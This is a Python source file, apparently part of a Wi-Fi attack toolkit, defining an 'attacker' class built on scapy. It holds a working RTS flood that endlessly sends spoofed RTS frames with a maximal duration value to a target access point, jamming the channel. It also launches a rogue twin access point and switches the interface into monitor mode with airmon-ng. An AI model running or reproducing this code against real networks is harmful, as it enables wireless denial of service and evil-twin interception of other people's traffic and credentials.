import multiprocessing
import threading
import time
import keyboard

import Drawer
from Sniffer_dir.common import bash
from Sniffer_dir.common import *
from Sniffer_dir.constants import *
from pathlib import Path


import struct
import sys

import scapy
from scapy import *
from scapy.layers.dot11 import RadioTap, Dot11, conf
from scapy.sendrecv import sendp

from Sniffer_dir import FakeAP

class attacker:
    def __init__(self, attack_int):
        self.attack_int = attack_int

    def __del__(self): # Destroy here all complex fields!!!
        self.screen = ""

    # def cts_flood(self):
    #     while True:
    #         print("ABCD")
    #         time.sleep(1)

    def rts_flood(self, args: dict):
        self.screen = Drawer.drawer()

        if "attacking_addr" in args.keys():
            attacking_addr = args["attacking_addr"]
        else:
            attacking_addr = '05:12:54:15:54:11'

        self.attack_int = self.__start_monitor_mode(self.attack_int)
        if args["Freq"] == '2.4':  # 2.4 GHz
            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот

        # conf = scapy.config.Conf()
        # conf.use_pcap = True

        bytes = struct.pack("<H", 32768)  # 32767 microseconds
        timeval = struct.unpack(">H", bytes)[0]
        # print(timeval)
        frame = RadioTap() / Dot11(type=1, subtype=11, addr1=args["BSSID"], addr2=attacking_addr, ID=timeval)
        # RadioTap() / Dot11(type=1, subtype=11, addr1 = target_addr, addr2 = my_addr, ID=timeval) #RTS
        # RadioTap() / Dot11(type=1, subtype=12, addr1 = target_addr, ID=timeval) #CTS
        quantity = 1000

        # frame.show()

        while True:
            sendp(frame, iface=self.attack_int, count=quantity, verbose=0)  # verbose=0, monitor=True


    def null_probe_response(self):
        print("null_probe_response")

    def rogue_twin(self, args: dict):
        self.screen = Drawer.drawer()

        print(args.keys())
        print(args.values())
        if args["Freq"] == '2.4':  # 2.4 GHz
            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот

            ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]))
            ap.launch()


    def __GetInterfaces(self):
        retval = []
        p = Path(INTERFACESPATH)
        for i in os.listdir(INTERFACESPATH):
            for iface in os.listdir(p / i / INTERFACESPATHAPPENDIX):
                retval.append(iface)
        return retval

    def __start_monitor_mode(self, interface):  # возвращает имя интерфейса после его перевода в режим монитора
        bash(f"airmon-ng check kill")
        bash(f"airmon-ng start {interface}")
        for i in self.__GetInterfaces():
            if interface in i:
                self.interface = i
                return i

        return None

    def __change_channel(self, interface, channel: int = 1):
        bash(f"iwconfig {interface} channel {channel}")
